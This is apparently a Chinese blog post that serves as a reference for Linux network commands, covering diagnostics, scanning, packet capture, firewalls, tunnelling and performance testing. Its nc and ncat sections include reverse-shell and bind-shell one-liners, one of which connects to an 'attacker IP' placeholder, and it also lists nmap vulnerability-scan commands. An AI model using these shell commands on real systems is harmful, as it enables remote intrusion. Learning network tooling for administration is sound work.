+++
title = "网络命令大全：从基础到高级实用指南"
date = "2026-03-16T19:54:28+08:00"

[taxonomies]
tags = ["网络", "Linux", "ssh", "命令行", "运维", "安全"]

[extra]
summary = "一份全面的网络命令参考指南，涵盖从基础网络诊断到高级安全工具的25+个实用命令，适合系统管理员、网络工程师和安全研究人员。"
author = "博主"
+++

# 网络命令大全：从基础到高级实用指南

在网络管理和系统运维的日常工作中，熟练掌握各种网络命令是必不可少的技能。无论你是刚入门的系统管理员，还是经验丰富的网络工程师，这份全面的网络命令参考指南都将为你提供实用的帮助。

本文涵盖了 **25+ 个核心网络命令**，从基础的网络诊断工具（如 `ping`、`traceroute`）到高级的安全扫描和流量分析工具（如 `nmap`、`tcpdump`、`wireshark`），每个命令都配有详细的用法说明和实用示例。文章内容按照功能分类，便于快速查找和学习。

**适合人群：**
- 系统管理员和运维工程师
- 网络工程师和安全研究人员
- 开发人员和 DevOps 从业者
- 对网络技术感兴趣的学习者

---

## 一、**核心网络状态和连接命令**

### **1. `ss` - Socket Statistics (现代替代netstat)**
```bash
# 基本用法
ss -tulpn          # 显示所有监听/连接端口 (TCP/UDP)
ss -tan            # 显示所有TCP连接
ss -s              # 显示统计摘要

# 高级用法
ss -t state established  # 只看已建立连接
ss -t sport = :443       # 只看源端口443
ss dst 192.168.1.1       # 只看目标IP的连接
ss -o                    # 显示定时器信息

# 实用组合
ss -tnp | grep :22       # 查看谁连接到22端口
ss -tn state time-wait   # 查看TIME-WAIT状态的连接
```

### **2. `netstat` - 传统网络状态查看**
```bash
# 尽管ss更优，netstat在某些环境仍有用
netstat -tunlp           # 等价于 ss -tulpn
netstat -rn              # 显示路由表
netstat -s               # 按协议统计
netstat -i               # 网络接口统计
netstat -an | grep ESTABLISHED  # 已建立连接
```

## 二、**端口扫描和服务探测工具**

### **3. `nmap` - 全能网络扫描器**
```bash
# 基础扫描
nmap -sS 192.168.1.1              # SYN扫描(半开放)
nmap -sT 192.168.1.1              # TCP连接扫描
nmap -sU 192.168.1.1              # UDP扫描
nmap -p 22,80,443 192.168.1.1     # 指定端口
nmap -p 1-1024 192.168.1.1        # 端口范围

# 高级扫描
nmap -A 192.168.1.1               # 全面探测(OS、服务、脚本)
nmap -O 192.168.1.1               # 操作系统探测
nmap -sV 192.168.1.1              # 服务版本识别
nmap -sC 192.168.1.1              # 默认脚本扫描

# 网络发现
nmap -sn 192.168.1.0/24           # Ping扫描(不扫描端口)
nmap -PR 192.168.1.0/24           # ARP扫描(LAN)
nmap -6 2001:db8::/64             # IPv6扫描

# 输出格式
nmap -oN output.txt 192.168.1.1   # 普通文本
nmap -oX output.xml 192.168.1.1   # XML格式
nmap -oG output.grep 192.168.1.1  # Grep友好格式

# 实用技巧
nmap -T4 -F 192.168.1.1           # 快速扫描(常用端口)
nmap --script vuln 192.168.1.1    # 漏洞扫描
nmap -iL targets.txt              # 从文件读取目标
```

### **4. `nc`/`netcat` - 瑞士军刀**
```bash
# 端口扫描
nc -zv 192.168.1.1 80             # 测试单个端口
nc -zv 192.168.1.1 20-30          # 测试端口范围

# 监听和连接
nc -l 4444                        # 监听TCP端口4444
nc -lu 4444                       # 监听UDP端口4444
nc 192.168.1.1 80                 # 连接TCP端口

# 文件传输
# 接收方：
nc -l 4444 > file.txt
# 发送方：
nc 接收方IP 4444 < sendfile.txt

# 端口代理/重定向
nc -l 4444 -c "nc 目标 80"        # 简单的TCP代理

# 建立反向shell
# 攻击机监听：
nc -lv 4444
# 目标机连接：
nc -e /bin/bash 攻击机IP 4444

# 建立bind shell
# 目标机监听：
nc -l -p 4444 -e /bin/bash
# 攻击机连接：
nc 目标机IP 4444

# HTTP请求
echo -e "GET / HTTP/1.1\r\nHost: google.com\r\n\r\n" | nc google.com 80
```

## 三、**网络诊断和路由命令**

### **5. `ping` 和变种**
```bash
# 基础ping
ping -c 4 8.8.8.8                # ping 4次
ping -i 0.2 8.8.8.8              # 每0.2秒ping一次
ping -s 1472 8.8.8.8             # 设置包大小(测试MTU)

# 高级ping
# Windows风格枚举(ICMP)
# hping3 (更强大的ping)
hping3 -S -p 80 -c 5 192.168.1.1   # TCP SYN ping
hping3 -1 -c 3 192.168.1.1         # ICMP ping
hping3 --udp -p 53 -c 3 8.8.8.8    # UDP ping
```

### **6. `traceroute`/`tracepath`/`mtr`**
```bash
# traceroute (TCP/UDP/ICMP)
traceroute 8.8.8.8               # ICMP traceroute
traceroute -T -p 443 8.8.8.8     # TCP traceroute (到443)
traceroute -U -p 53 8.8.8.8      # UDP traceroute (到53)

# tracepath (不需要root)
tracepath 8.8.8.8               # 类似traceroute但更简单

# mtr (My TraceRoute - 实时监控)
mtr 8.8.8.8                     # 实时traceroute+ping
mtr -r -c 10 8.8.8.8           # 运行10次后报告
mtr --tcp -P 443 8.8.8.8        # TCP模式到443端口
```

### **7. `tcpdump` - 包捕获和分析**
```bash
# 基础抓包
tcpdump -i eth0                 # 监听eth0接口
tcpdump -i any                  # 监听所有接口
tcpdump -w capture.pcap         # 保存到文件
tcpdump -r capture.pcap         # 读取文件

# 过滤
tcpdump host 192.168.1.1       # 主机过滤
tcpdump port 80                # 端口过滤
tcpdump src 192.168.1.100      # 源地址
tcpdump dst 192.168.1.100      # 目标地址
tcpdump net 192.168.1.0/24     # 网络过滤

# 协议过滤
tcpdump icmp                   # 只抓ICMP
tcpdump tcp                    # 只抓TCP
tcpdump udp                    # 只抓UDP

# 高级过滤
tcpdump 'tcp[13] & 2 != 0'    # 抓SYN包
tcpdump 'tcp[13] & 16 != 0'   # 抓ACK包
tcpdump 'tcp[13] & 4 != 0'    # 抓RST包

# 显示选项
tcpdump -n                     # 不解析主机名
tcpdump -X                     # 十六进制+ASCII
tcpdump -A                     # ASCII内容
tcpdump -v                     # 详细信息
tcpdump -vv                    # 更详细

# 实用组合
tcpdump -i eth0 -n -s0 -w capture.pcap 'port 53'  # 抓DNS查询
```

### **8. `Wireshark`/`tshark` (命令行版)**
```bash
# tshark - 命令行版Wireshark
tshark -i eth0                    # 基础抓包
tshark -r capture.pcap           # 读取文件

# 高级过滤
tshark -Y "http.request"         # 显示HTTP请求
tshark -Y "dns.flags.response == 0"  # 显示DNS查询
tshark -Y "tcp.port == 443"      # HTTPS流量

# 输出格式
tshark -r file.pcap -T fields -e ip.src -e ip.dst  # 特定字段
tshark -r file.pcap -z io,stat,0.01               # 流量统计
```

## 四、**防火墙和网络配置命令**

### **9. `iptables` - Linux防火墙**
```bash
# 查看规则
iptables -L -n -v               # 列出所有规则
iptables -L INPUT -n            # 只查看INPUT链
iptables -S                     # 以命令形式显示

# 基本规则管理
iptables -A INPUT -s 192.168.1.100 -j DROP   # 阻止IP
iptables -A INPUT -p tcp --dport 22 -j ACCEPT # 允许SSH

# 实用规则
# 阻止端口扫描
iptables -A INPUT -p tcp --tcp-flags ALL ALL -j DROP

# 防止SYN洪水攻击
iptables -A INPUT -p tcp --syn -m limit --limit 1/s -j ACCEPT

# NAT和端口转发
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080

# 保存和恢复
iptables-save > /etc/iptables.rules
iptables-restore < /etc/iptables.rules
```

### **10. `nftables` - 新一代防火墙**
```bash
# 查看规则
nft list ruleset

# 创建表和链
nft add table inet filter
nft add chain inet filter input { type filter hook input priority 0 \; }

# 添加规则
nft add rule inet filter input tcp dport 22 accept
nft add rule inet filter input ip saddr 192.168.1.100 drop

# 保存配置
nft list ruleset > /etc/nftables.conf
```

### **11. `ip` - 瑞士军刀网络工具**
```bash
# 接口管理
ip addr show                    # 显示所有接口
ip addr add 192.168.1.100/24 dev eth0  # 添加IP
ip link set eth0 up            # 启用接口
ip link set eth0 down          # 禁用接口

# 路由管理
ip route show                  # 显示路由表
ip route add default via 192.168.1.1  # 添加默认路由
ip route add 10.0.0.0/24 via 192.168.1.254  # 添加静态路由

# 邻居(ARP)表
ip neigh show                  # 显示ARP表
ip neigh flush dev eth0       # 清空ARP表

# 统计信息
ip -s link                    # 接口统计
```

### **12. `route` - 传统路由工具**
```bash
route -n                      # 显示数字格式路由表
route add default gw 192.168.1.1  # 添加默认网关
route del default             # 删除默认路由
```

## 五、**服务测试和HTTP工具**

### **13. `curl` - 全能HTTP客户端**
```bash
# 基础请求
curl http://example.com        # GET请求
curl -I http://example.com     # 只显示头部(HEAD)
curl -v http://example.com     # 显示详细信息

# 提交数据
curl -X POST http://example.com -d "param1=value1"  # POST表单
curl -X POST http://example.com -H "Content-Type: application/json" \
     -d '{"key":"value"}'      # POST JSON

# 认证和代理
curl -u username:password http://example.com  # HTTP基本认证
curl --proxy http://proxy:8080 http://example.com  # 使用代理

# 文件上传下载
curl -O http://example.com/file.zip          # 下载文件
curl -T file.zip http://example.com/upload   # 上传文件

# 高级选项
curl -k https://example.com                  # 忽略SSL证书错误
curl --resolve example.com:443:1.2.3.4 https://example.com  # 自定义DNS
curl --limit-rate 100K http://example.com/file.zip  # 限速下载

# 测试REST API
curl -X PUT -H "Content-Type: application/json" \
     -d '{"name":"new"}' http://api.example.com/resource/1
```

### **14. `wget` - 另一个下载工具**
```bash
wget http://example.com/file.zip             # 下载文件
wget -r -l 2 http://example.com              # 递归下载2层
wget -c http://example.com/file.zip          # 断点续传
wget --mirror --convert-links http://example.com  # 镜像网站
```

### **15. `dig` - DNS查询工具**
```bash
dig example.com                  # 基本查询
dig +short example.com           # 简短输出
dig example.com A                # 查询A记录
dig example.com MX               # 查询MX记录
dig @8.8.8.8 example.com         # 指定DNS服务器查询

# 反向DNS
dig -x 8.8.8.8                    # PTR查询

# DNS追踪
dig +trace example.com            # 显示完整解析路径

# 获取所有记录
dig example.com ANY               # 获取所有类型的记录
```

### **16. `nslookup` - 传统DNS查询工具**
```bash
nslookup example.com              # 基础查询
nslookup -type=MX example.com     # 查询MX记录
nslookup 8.8.8.8                  # 反向DNS
server 8.8.8.8                    # 更改DNS服务器
```

## 六、**高级隧道和代理工具**

### **17. `ssh` - 不仅仅是远程登录**
```bash
# 端口转发(前面已详细讨论，这里补充)
ssh -L 8080:localhost:80 user@server      # 本地转发
ssh -R 2222:localhost:22 user@server      # 远程转发
ssh -D 1080 user@server                   # 动态SOCKS代理

# 连接复用
ssh -o ControlMaster=yes -o ControlPath=~/.ssh/control_%r@%h:%p user@server
ssh -o ControlMaster=no -o ControlPath=~/.ssh/control_%r@%h:%p user@server

# 执行远程命令
ssh user@server "ls -la /tmp"
ssh user@server "tar cz /logs" > logs.tar.gz  # 直接压缩下载
```

### **18. `scp`/`sftp`/`rsync` - 安全文件传输**
```bash
# scp
scp file.txt user@server:/path/           # 上传
scp user@server:/path/file.txt ./         # 下载
scp -r dir/ user@server:/path/            # 递归传输目录

# rsync (更高效)
rsync -avz dir/ user@server:/path/        # 同步目录
rsync -avz --delete dir/ user@server:/path/  # 删除多余文件
rsync -avz -e ssh dir/ user@server:/path/   # 通过SSH
rsync --progress file user@server:/path/  # 显示进度
```

### **19. `socat` - netcat的超集**
```bash
# 基础监听/连接
socat TCP-LISTEN:4444 -                       # 监听TCP
socat UDP-LISTEN:4444 -                       # 监听UDP
socat - TCP:192.168.1.1:80                    # 连接TCP

# 端口转发
socat TCP-LISTEN:80,fork TCP:192.168.1.100:80  # 简单代理

# SSL连接
socat openssl-listen:443,cert=server.pem,verify=0 -

# 串口转发
socat PTY,link=/dev/ttyS0 TCP:192.168.1.100:4444

# 文件传输
socat -u TCP-LISTEN:4444 open:file.txt,create  # 接收文件
socat -u open:file.txt TCP:192.168.1.100:4444  # 发送文件
```

### **20. 新增：`ncat` (nmap的netcat版本)**
```bash
# 比传统nc功能更强大
ncat -l 4444 --keep-open --exec "/bin/bash"        # 绑定shell
ncat -l 4444 --ssl --ssl-cert cert.pem --ssl-key key.pem  # SSL监听
ncat --proxy-type http --proxy 192.168.1.1:8080 google.com 80  # HTTP代理
ncat -l 4444 -c "ncat 192.168.1.100 5555"         # 端口中继
```

## 七、**性能测试工具**

### **21. `iperf3` - 网络性能测试**
```bash
# 服务器端
iperf3 -s

# 客户端
iperf3 -c server_ip                     # TCP测试
iperf3 -c server_ip -u -b 1G            # UDP测试，1Gbps
iperf3 -c server_ip -P 10               # 10个并行连接
iperf3 -c server_ip -t 30               # 测试30秒
iperf3 -c server_ip -R                  # 反向测试(服务器到客户端)
```

### **22. `netperf` - 另一个性能测试工具**
```bash
# 服务器端
netserver

# 客户端
netperf -H server_ip                    # TCP_STREAM测试
netperf -H server_ip -t TCP_RR          # TCP请求/响应测试
netperf -H server_ip -t UDP_STREAM      # UDP流测试
```

## 八、**流量监控和分析**

### **23. `iftop` - 实时带宽监控**
```bash
iftop -i eth0                      # 监控特定接口
iftop -n                          # 不解析主机名
iftop -N                          # 不解析端口服务名
iftop -F 192.168.0.0/24           # 只显示特定网络的流量
```

### **24. `nethogs` - 按进程监控带宽**
```bash
nethogs eth0                     # 显示每个进程的带宽使用
nethogs -v 3                    # 显示命令名和PID
nethogs -d 5                    # 每5秒刷新一次
```

### **25. `vnstat` - 网络流量统计**
```bash
vnstat                          # 显示摘要
vnstat -d                      # 每日统计
vnstat -m                      # 每月统计
vnstat -h                      # 每小时统计
vnstat -l                      # 实时监控
```

## 九、**实用脚本和一行命令**

### **网络检查脚本**
```bash
#!/bin/bash
# 快速网络诊断
echo "=== 网络接口 ==="
ip addr show
echo "=== 路由表 ==="
ip route show
echo "=== DNS解析 ==="
nslookup google.com
echo "=== 连通性测试 ==="
ping -c 2 8.8.8.8
```

### **端口扫描一行命令**
```bash
# 扫描192.168.1.1-254的80端口
for i in {1..254}; do timeout 1 bash -c "</dev/tcp/192.168.1.$i/80" 2>/dev/null && echo "192.168.1.$i:80 is open"; done

# 扫描常用端口
for port in 21 22 23 25 80 443 3306; do nc -zv 192.168.1.1 $port 2>&1 | grep succeeded; done
```

### **查看占用端口的进程**
```bash
# 查找哪个进程在使用80端口
lsof -i :80
# 或
fuser -v 80/tcp
```

### **测试TLS/SSL连接**
```bash
# 检查SSL证书
openssl s_client -connect example.com:443 -servername example.com < /dev/null

# 测试特定协议版本
openssl s_client -tls1_3 -connect example.com:443

# 检查证书过期时间
openssl s_client -connect example.com:443 2>/dev/null | openssl x509 -noout -dates
```

## 十、**组合使用的实用例子**

### **1. 快速网络审计**
```bash
# 查看所有开放的端口和对应的进程
sudo ss -tulpn | awk 'NR>1 {print $5,$7}' | column -t

# 监控实时的TCP连接建立
watch -n 1 'netstat -tan | grep ESTABLISHED | wc -l'
```

### **2. 网络故障排查流程**
```bash
# 1. 检查接口
ip addr show eth0
# 2. 检查路由
ip route show
# 3. 检查DNS
dig @8.8.8.8 google.com +short
# 4. 检查连通性
ping -c 4 8.8.8.8
# 5. 检查特定端口
nc -zv google.com 443
# 6. 抓包分析
tcpdump -i eth0 -n -c 10 port 443
```

### **3. 安全的远程端口转发**
```bash
# 通过SSH建立安全隧道访问内部服务
ssh -N -L 3307:内部数据库:3306 -p 2222 堡垒机用户@堡垒机IP

# 再通过本地MySQL客户端连接
mysql -h 127.0.0.1 -P 3307 -u dbuser -p
```

## **总结与建议**

### **学习路径建议：**
1. **初学者**：先掌握 `ping`, `netstat`, `traceroute`, `curl`
2. **中级用户**：学习 `ss`, `tcpdump`, `nmap`, `iptables`
3. **高级用户**：精通 `tshark`, `socat`, 防火墙策略, 网络隧道

### **安全注意事项：**
1. **慎用扫描工具**：未经授权的扫描可能违法
2. **限制端口转发**：防止被用作攻击跳板
3. **保护敏感信息**：避免在命令历史中留下密码
4. **使用安全协议**：优先使用SSH而不是telnet，HTTPS而不是HTTP

### **进阶推荐：**
- **自动化工具**：Ansible, SaltStack, Puppet
- **网络监控**：Zabbix, Nagios, Prometheus
- **网络安全**：Snort, Suricata, Zeek

这些命令构成了现代网络管理和安全工作的基础工具集。通过组合使用它们，你可以诊断复杂的网络问题、实现强大的网络功能，并构建安全可靠的网络架构。
